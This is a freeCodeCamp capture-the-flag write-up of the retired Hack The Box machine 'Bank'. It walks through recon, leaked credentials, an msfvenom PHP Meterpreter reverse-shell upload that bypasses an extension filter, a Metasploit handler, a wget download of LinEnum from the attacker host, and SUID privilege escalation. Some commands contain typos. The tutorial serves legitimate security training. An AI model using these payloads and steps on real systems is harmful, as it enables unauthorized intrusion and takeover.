---
title: Keep Calm and Hack The Box - Bank
subtitle: ''
author: Sonya Moisset
co_authors: []
series: null
date: '2020-05-20T09:18:26.000Z'
originalURL: https://freecodecamp.org/news/keep-calm-and-hack-the-box-bank
coverImage: https://www.freecodecamp.org/news/content/images/2020/05/wallpaperflare.com_wallpaper.jpg
tags:
- name: Application Security
  slug: application-security
- name: cybersecurity
  slug: cybersecurity
- name: Ethical Hacking
  slug: ethical-hacking
- name: hacking
  slug: hacking
- name: Linux
  slug: linux
- name: Security
  slug: security
seo_title: null
seo_desc: Hack The Box (HTB) is an online platform allowing you to test your penetration
  testing skills. It contains several challenges that are constantly updated. Some
  of them are simulating real world scenarios and some of them lean more towards a
  CTF style...
---

Hack The Box (HTB) is an online platform allowing you to test your penetration testing skills. It contains several challenges that are constantly updated. Some of them are simulating real world scenarios and some of them lean more towards a CTF style of challenge.

**Note**. _Only write-ups of retired HTB machines are allowed._

![Image](https://www.freecodecamp.org/news/content/images/2020/04/Screenshot-2020-04-30-at-14.17.33.png)

Bank is a relatively simple machine, however proper web enumeration is key to finding the necessary data for entry

We will use the following tools to pawn the box on a [Kali Linux box](https://www.kali.org/):

* nmap
* gobuster
* Searchsploit
* msfconsole
* metasploit
* meterperter
* LinEnum

Let's get started.

## Step 1 - Reconnaissance

The first step before exploiting a machine is to do a little bit of scanning and reconnaissance.

This is one of the most important parts as it will determine what you can try to exploit afterwards. It is always better to spend more time on this phase to get as much information as you can.

## Port scanning

I will use Nmap (Network Mapper). Nmap is a free and open source utility for network discovery and security auditing. It uses raw IP packets to determine what hosts are available on the network, what services those hosts are offering, what operating systems they are running, what type of packet filters/firewalls are in use, and dozens of other characteristics. 

There are many commands you can use with this tool to scan the network. If you want to learn more about it, you can have a look at the documentation [here](https://tools.kali.org/information-gathering/nmap).

![Image](https://www.freecodecamp.org/news/content/images/2020/05/Screenshot-2020-05-17-at-21.57.03.png)

I use the following command to perform an intensive scan:

```bash
nmap -A -v bank.htb
```

**-A:** Enable OS detection, version detection, script scanning, and traceroute

**-v:** Increase verbosity level

**bank.htb:** hostname for the Bank box

If you find the results a little bit too overwhelming, you can do another command to get only the open ports.

```bash
nmap bank.htb
```

![Image](https://www.freecodecamp.org/news/content/images/2020/05/Screenshot-2020-05-17-at-21.58.21.png)

We can see that there are 3 open ports:

**Port 22**, Secure Shell (SSH), secure logins, file transfers (scp, sftp) and port forwarding

**Port 53**, Domain Name System (DNS)

**Port** 80, most often used by Hypertext Transfer Protocol (HTTP)

## Directory scanning

I use Gobuster. Gobuster is a directory scanner written in Go. More info on the tool [here](https://tools.kali.org/web-applications/gobuster). Gobuster uses wordlists on Kali which are located in the **/usr/share/wordlists** directory. I'm using wordlists from **dirb** and **dirbuster**, but you can download more wordlists from **SecLists** [here](https://github.com/danielmiessler/SecLists)

I use this command for the dirb common.txt wordlist

```bash
gobuster dir -u bank.htb -w /usr/share/wordlists/dirb/common.txt
```

![Image](https://www.freecodecamp.org/news/content/images/2020/05/Screenshot-2020-05-17-at-22.06.10.png)

I can see some interesting folders. I do another directory scan with a different wordlist.

```bash
gobuster dir -u bank.htb -w /usr/share/worldlists/dirbuster/directory-list-lowercase-2.3-medium.txt
```

![Image](https://www.freecodecamp.org/news/content/images/2020/05/Screenshot-2020-05-17-at-22.06.18.png)



## Step 2 - Visiting the web page

From the reconnaissance phase, I decide to start with port 80. It points to an Apache2 Ubuntu Default page. We need to set the hostname. We will follow the standard convention for the HTB machines, bank.htb 

![Image](https://www.freecodecamp.org/news/content/images/2020/05/Screenshot-2020-05-17-at-22.38.13.png)

I add bank on the /etc/hosts file

```bash
nano /etc/hosts
```

with

```bash
10.10.10.29     bank.htb
```

![Image](https://www.freecodecamp.org/news/content/images/2020/05/Screenshot-2020-05-17-at-21.55.29.png)

I check the file with

```bash
cat /etc/hosts
```

![Image](https://www.freecodecamp.org/news/content/images/2020/05/Screenshot-2020-05-17-at-22.39.54.png)

When I navigate to bank.htb, I can see a login page now

![Image](https://www.freecodecamp.org/news/content/images/2020/05/Screenshot-2020-05-17-at-22.07.14.png)

From the gobuster reconnaissance, I found some folders. I navigate to **/balance-transfer**

![Image](https://www.freecodecamp.org/news/content/images/2020/05/Screenshot-2020-05-17-at-22.03.19.png)

I have a look at a couple of files. All the files seems to have the full name, email and password encrypted. 

![Image](https://www.freecodecamp.org/news/content/images/2020/05/Screenshot-2020-05-17-at-22.04.41.png)

I go back to the main page and I click on the **Size** tab to sort the transfers. I can see that one of the file is different

![Image](https://www.freecodecamp.org/news/content/images/2020/05/Screenshot-2020-05-17-at-22.03.53.png)

When I click on the file, I see an error message at the top. The encryption failed for this file. I can see all the details in plain text

![Image](https://www.freecodecamp.org/news/content/images/2020/05/Screenshot-2020-05-17-at-22.05.14.png)

I go back to the login panel and enter the credentials. I now have access to the dashboard of the HTB Bank. Nothing interesting on this page, so I move to the **Support** page

![Image](https://www.freecodecamp.org/news/content/images/2020/05/Screenshot-2020-05-17-at-22.07.43.png)

On the Support page, I can upload files. I will try to upload a payload

![Image](https://www.freecodecamp.org/news/content/images/2020/05/Screenshot-2020-05-17-at-22.08.21.png)

## **Step 3 -** Using MSFvenom to craft an exploit

We will use MSFvenom, which is a payload generator . You can learn more about it [here](https://www.offensive-security.com/metasploit-unleashed/msfvenom/)

![Image](https://www.freecodecamp.org/news/content/images/2020/05/Screenshot-2020-05-17-at-22.09.17.png)

But first, let's see on **[Metasploit Framework](https://www.metasploit.com/)** which payload we could use to craft our exploit

We know that we need to create a **reverse shell**, which is a type of shell in which the target machine communicates back to the attacking machine. The attacking machine has a listener port on which it receives the connection, which by using, code or command execution is achieved.

![Image](https://www.freecodecamp.org/news/content/images/2019/08/Screenshot-2019-08-06-at-22.53.40.png)
_[https://resources.infosecinstitute.com/icmp-reverse-shell/](https://resources.infosecinstitute.com/icmp-reverse-shell/)_

The reverse TCP shell should be for PHP and we will use **Meterpreter**

From the Offensive Security website, we get this definition for Meterpreter

> Meterpreter is an advanced, dynamically extensible payload that uses _in-memory_ DLL injection stagers and is extended over the network at runtime. It communicates over the stager socket and provides a comprehensive client-side Ruby API. It features command history, tab completion, channels, and more.

You can read more about Meterpreter [here](https://www.offensive-security.com/metasploit-unleashed/about-meterpreter/)

![Image](https://www.freecodecamp.org/news/content/images/2020/05/Screenshot-2020-05-19-at-20.58.43.png)

I launch **Metasploit** and search for reverse TCP payloads. I use the following command

```bash
search php meterpreter reverse_tcp
```

I find an interesting payload, number 594, which is a **Reverse TCP Stager**. This payload injects the meterpreter server DLL via the Reflective Dll Injection payload and connects back to the attacker 

```bash
payload/php/meterpreter/reverse_tcp
```

Now let's go back to **msfvenom** to craft our exploit

![Image](https://www.freecodecamp.org/news/content/images/2020/05/Screenshot-2020-05-17-at-22.10.36.png)

I use the following command

```bash
msfvenom -p php/meterpreter/reverse_tcp lhost=10.10.14.36 lport=443 -f raw > HTBbankshell.php
```

I then check with **ls** if the file has been created

![Image](https://www.freecodecamp.org/news/content/images/2020/05/Screenshot-2020-05-17-at-22.10.44.png)

and I cat the file to see the exploit with

```bash
cat HTBbankshell.php
```

![Image](https://www.freecodecamp.org/news/content/images/2020/05/Screenshot-2020-05-17-at-22.11.25.png)

I go back to the support page. I add the title, the message and upload the file on the form

![Image](https://www.freecodecamp.org/news/content/images/2020/05/Screenshot-2020-05-17-at-22.12.37.png)

I click on the submit button and I see an error message. The file type doesn't seem to work

![Image](https://www.freecodecamp.org/news/content/images/2020/05/Screenshot-2020-05-17-at-22.14.10.png)

I check the source code and I see a comment that indicates that the file extension **.htb** is needed to execute php for debugging purposes only

![Image](https://www.freecodecamp.org/news/content/images/2020/05/Screenshot-2020-05-17-at-22.14.42.png)

I then change the extension of my payload from **HTBbankshell.php** to **HTBbankshell.htb**

![Image](https://www.freecodecamp.org/news/content/images/2020/05/Screenshot-2020-05-17-at-22.15.42.png)

My file is now ready to be uploaded on the support page

![Image](https://www.freecodecamp.org/news/content/images/2020/05/Screenshot-2020-05-17-at-22.16.02.png)

And it seems to work! The payload has been uploaded on the support page

![Image](https://www.freecodecamp.org/news/content/images/2020/05/Screenshot-2020-05-17-at-22.16.38.png)

## **Step 4 -** Setting up a listener with Metasploit

Back on Metasploit where I use the following command to set the payload handler

```bash
use exploit/multi/handler
```

I first set up the payload

```bash
set payload php/meterpreter/reverse_tcp
```

Then the LHOST

```bash
set lhost 10.10.14.36
```

And finally the LPORT

```bash
set lport 4444
```

If we check the options now, we should see that everything is set up

![Image](https://www.freecodecamp.org/news/content/images/2020/05/Screenshot-2020-05-17-at-22.18.28.png)

Let's run the exploit. 

After this message appears

```bash
Started reverse TCP handler on 10.10.14.36:4444
```

go back to the browser and refresh the page where the malicious script is hosted

```bash
bank.htb/uploads/HTBbankshell.php
```

![Image](https://www.freecodecamp.org/news/content/images/2020/05/Screenshot-2020-05-17-at-22.17.09.png)

You should then see a Meterpreter session created

![Image](https://www.freecodecamp.org/news/content/images/2020/05/Screenshot-2020-05-17-at-22.19.20.png)

I start by gathering some information with **getuid** which returns the real user ID of the calling process and **sysinfo**

![Image](https://www.freecodecamp.org/news/content/images/2020/05/Screenshot-2020-05-17-at-22.19.33.png)

## **Step 5 - Looking for the user.txt flag**

I start navigating to root and list the folders/files.

![Image](https://www.freecodecamp.org/news/content/images/2020/05/Screenshot-2020-05-17-at-22.20.44.png)

I move to the **home** directory with 

```bash
cd home
```

And I can see a user called **chris**

![Image](https://www.freecodecamp.org/news/content/images/2020/05/Screenshot-2020-05-17-at-22.20.54.png)

I move to the **chris** directory and when I list the files...

![Image](https://www.freecodecamp.org/news/content/images/2020/05/Screenshot-2020-05-17-at-22.21.06.png)

I find the **user.txt** file! To read the content of the file I use the command

```bash
cat user.txt
```

Now that we have the user flag, let's find the root flag!

## Step 6 - Performing Privilege Escalation

I try to navigate to the root folder and the access is denied

![Image](https://www.freecodecamp.org/news/content/images/2020/05/Screenshot-2020-05-17-at-22.33.19.png)

I will use **LinEnum** to enumerate more information from this machine. **LinEnum** is used for scripted local Linux enumeration and privilege escalation checks. More info [here](https://github.com/rebootuser/LinEnum)

I fetch LinEnum from **GitHub** with

```bash
wget https://https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
```

![Image](https://www.freecodecamp.org/news/content/images/2020/05/Screenshot-2020-05-17-at-22.43.05.png)

I check with this command if the script has been correctly fetched

```bash
ls -la
```

![Image](https://www.freecodecamp.org/news/content/images/2020/05/Screenshot-2020-05-17-at-22.43.17.png)

I use the following command

```bash
chmod 777 LinEnum.sh
```

to change the file permission and make it readable, writable and executable by everyone

![Image](https://www.freecodecamp.org/news/content/images/2020/05/Screenshot-2020-05-17-at-22.43.34.png)

Within meterpreter I check the location of the file with

```bash
lls -S "LinEnum.sh"
```

![Image](https://www.freecodecamp.org/news/content/images/2020/05/Screenshot-2020-05-17-at-23.07.42.png)

I start a php server on another terminal with

```bash
php -S 10.10.14.36:4444
```

![Image](https://www.freecodecamp.org/news/content/images/2020/05/Screenshot-2020-05-17-at-22.45.45.png)

I type the following command to get a standard shell on the target system

```bash
shell
```

I spawn a TTY shell with

```bash
python3 -c 'import pty;pty.spawn("/bin/bash/")'
```

And I transfer the file to the machine with

```bash
wget http://10.10.14.36:4444/LinEnum.sh -O /tmp/LinEnum.sh
```

where I copy the file from my Kali box to the machine temp folder

![Image](https://www.freecodecamp.org/news/content/images/2020/05/Screenshot-2020-05-17-at-22.49.38.png)

I then navigate to the temp folder to check if the file has been correctly moved

![Image](https://www.freecodecamp.org/news/content/images/2020/05/Screenshot-2020-05-17-at-23.17.45.png)

I then run the script with

```bash
sh ./LinEnum.sh
```

![Image](https://www.freecodecamp.org/news/content/images/2020/05/Screenshot-2020-05-17-at-22.52.07.png)

The scan gives me a lot of information. I look for the **interesting files** section. I check the **SUID files** section. **SUID** is defined as giving temporary permissions to a user to run a program/file with the permissions of the file owner rather that the user who runs it

I spot an interesting file

```bash
/var/htb/bin/emergency
```

![Image](https://www.freecodecamp.org/news/content/images/2020/05/Screenshot-2020-05-17-at-22.53.13.png)

I navigate to **var/htb/emergency**

![Image](https://www.freecodecamp.org/news/content/images/2020/05/Screenshot-2020-05-17-at-23.19.03.png)

I run it with

```bash
./emergency
```

and I'm asked if I want to get a root shell :)

![Image](https://www.freecodecamp.org/news/content/images/2020/05/Screenshot-2020-05-17-at-23.20.07.png)

I have root access to the machine

![Image](https://www.freecodecamp.org/news/content/images/2020/05/Screenshot-2020-05-17-at-23.20.53.png)

I can now navigate to the **root** folder

![Image](https://www.freecodecamp.org/news/content/images/2020/05/Screenshot-2020-05-17-at-23.21.31.png)

I find the **root.txt** file! 

To read the content of the file I use the command

```bash
cat root.txt
```

Congrats! You found both flags!

---

Please don’t hesitate to comment, ask questions or share with your friends :)

You can see more of my articles [here](https://www.freecodecamp.org/news/author/sonya/)

You can follow me on [Twitter](https://twitter.com/SonyaMoisset) or on [LinkedIn](https://www.linkedin.com/in/sonyamoisset/)

And don't forget to #**GetSecure**, #**BeSecure** & #**StaySecure**!

---

**Other Hack The Box articles**

* [Keep Calm and Hack The Box - Lame](https://www.freecodecamp.org/news/keep-calm-and-hack-the-box-lame/)
* [Keep Calm and Hack The Box - Legacy](https://www.freecodecamp.org/news/keep-calm-and-hack-the-box-legacy/)
* [Keep Calm and Hack The Box - Devel](https://www.freecodecamp.org/news/keep-calm-and-hack-the-box-devel/)
* [Keep Calm and Hack The Box - Beep](https://www.freecodecamp.org/news/keep-calm-and-hack-the-box-beep/)
* [Keep Calm and Hack The Box - Optimum](https://www.freecodecamp.org/news/keep-calm-and-hack-the-box-optimum/)
* [Keep Calm and Hack The Box - Arctic](https://www.freecodecamp.org/news/keep-calm-and-hack-the-box-arctic/)
* [Keep Calm and Hack The Box - Grandpa](https://www.freecodecamp.org/news/keep-calm-and-hack-the-box-grandpa/)
* [Keep Calm and Hack The Box - Granny](https://www.freecodecamp.org/news/keep-calm-and-hack-the-box-granny/)

![Image](https://www.freecodecamp.org/news/content/images/2020/05/wallpaperflare.com_wallpaper-1.jpg)

